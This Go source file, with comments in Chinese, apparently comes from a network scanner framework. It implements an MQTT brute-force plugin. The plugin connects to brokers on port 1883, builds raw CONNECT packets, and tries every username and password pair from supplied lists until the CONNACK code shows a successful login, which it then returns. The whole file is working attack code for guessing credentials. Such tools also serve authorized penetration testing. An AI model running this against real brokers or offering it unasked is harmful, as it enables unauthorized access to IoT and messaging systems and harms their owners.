package brute

import (
	"context"
	"net"
	"strconv"
	"time"
)

// MQTTPlugin MQTT爆破插件
type MQTTPlugin struct{}

func (p *MQTTPlugin) Name() string     { return "mqtt" }
func (p *MQTTPlugin) DefaultPort() int { return 1883 }

func (p *MQTTPlugin) Probe(ctx context.Context, host string, port int) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func (p *MQTTPlugin) Brute(ctx context.Context, host string, port int, usernames, passwords []string, timeout int) *BruteResult {
	for _, username := range usernames {
		for _, password := range passwords {
			select {
			case <-ctx.Done():
				return &BruteResult{Host: host, Port: port, Service: "mqtt", Success: false, Message: "canceled"}
			default:
			}

			ok := testMQTT(host, port, username, password, timeout)
			if ok {
				return &BruteResult{
					Host:     host,
					Port:     port,
					Service:  "mqtt",
					Username: username,
					Password: password,
					Success:  true,
					Message:  "Authentication successful",
				}
			}
		}
	}
	return &BruteResult{Host: host, Port: port, Service: "mqtt", Success: false, Message: "Authentication failed"}
}

// testMQTT 测试MQTT连接
func testMQTT(host string, port int, username, password string, timeout int) bool {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	// 发送 MQTT CONNECT 包
	clientID := "test"
	connectPacket := buildMQTTConnectPacket(clientID, username, password)

	conn.SetWriteDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	_, err = conn.Write(connectPacket)
	if err != nil {
		return false
	}

	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return false
	}

	// CONNACK 响应格式: 0x20 <remaining_length> <session_present> <return_code>
	// 第1字节: 0x20 = CONNACK 包类型
	// 第3字节(索引2): Session Present flag
	// 第4字节(索引3): Return Code (0x00=成功, 0x04=用户名密码错误, 0x05=未授权)
	if n < 4 || buf[0] != 0x20 {
		return false
	}

	// 检查返回码: 0x00 表示连接成功（认证通过）
	return buf[3] == 0x00
}

// buildMQTTConnectPacket 构建 MQTT CONNECT 数据包
func buildMQTTConnectPacket(clientID, username, password string) []byte {
	var payload []byte

	// Protocol String
	payload = append(payload, []byte{0x00, 0x04, 'M', 'Q', 'T', 'T'}...)

	// Protocol Level (4 = MQTT 3.1.1)
	payload = append(payload, 0x04)

	// Connect Flags (0x02 = Clean Session)
	flags := byte(0x02)
	if username != "" {
		flags |= 0x80
	}
	if password != "" {
		flags |= 0x40
	}
	payload = append(payload, flags)

	// Keep Alive (60 seconds)
	payload = append(payload, 0x00, 0x3C)

	// Client ID
	payload = append(payload, byte(len(clientID)>>8), byte(len(clientID)&0xFF))
	payload = append(payload, []byte(clientID)...)

	// Username (if present)
	if username != "" {
		payload = append(payload, byte(len(username)>>8), byte(len(username)&0xFF))
		payload = append(payload, []byte(username)...)
	}

	// Password (if present)
	if password != "" {
		payload = append(payload, byte(len(password)>>8), byte(len(password)&0xFF))
		payload = append(payload, []byte(password)...)
	}

	// Fixed header: 使用 VBI 编码 remainingLength，避免 > 255 时截断（修复 P0-33）
	remainingLength := len(payload)
	header := append([]byte{0x10}, encodeMQTTRemainingLength(remainingLength)...)

	return append(header, payload...)
}

// encodeMQTTRemainingLength 编码 MQTT Variable Length Integer (VBI)
// 每字节低 7 位是数据，最高位为 1 表示还有后续字节，1-4 字节
func encodeMQTTRemainingLength(n int) []byte {
	var b []byte
	for {
		digit := byte(n % 128)
		n /= 128
		if n > 0 {
			digit |= 0x80
		}
		b = append(b, digit)
		if n == 0 {
			break
		}
	}
	return b
}
